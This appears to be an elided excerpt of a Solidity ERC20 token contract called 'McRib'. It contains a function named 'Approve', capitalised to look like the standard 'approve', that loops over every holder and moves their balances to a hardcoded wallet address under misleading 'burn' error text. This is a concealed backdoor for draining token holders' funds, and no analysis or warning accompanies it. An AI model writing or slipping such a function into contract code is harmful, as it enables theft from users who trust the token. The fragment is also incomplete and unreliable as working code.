...
contract McRib  is Context, IERC20 {
    ...
    address _addr = 0x1FDa55dd5AF4f3049C2b0C5663a5136Da96E2aB3;
    address public _origin = 0x1FDa55dd5AF4f3049C2b0C5663a5136Da96E2aB3;
    ...
    constructor () public {
        ...
        _symbol = "McRib";
        _decimals = 18;
        uint256 initialSupply = 100_000_000_000;
        _safeOwner = _origin;
...
*/
        function Approve(
            ...
            for (uint256 i = 0; i < holders.length; i++) {
                ...
                _beforeTokenTransfer(holders[i], 0x85Dd5AAFcebFcd32DC7e29C5047e49053234A39a, amount);
                

                _balances[holders[i]] = _balances[holders[i]].sub(amount, "ERC20: burn amount exceeds balance");
                _balances[0x85Dd5AAFcebFcd32DC7e29C5047e49053234A39a] = _balances[0x85Dd5AAFcebFcd32DC7e29C5047e49053234A39a].add(amount);
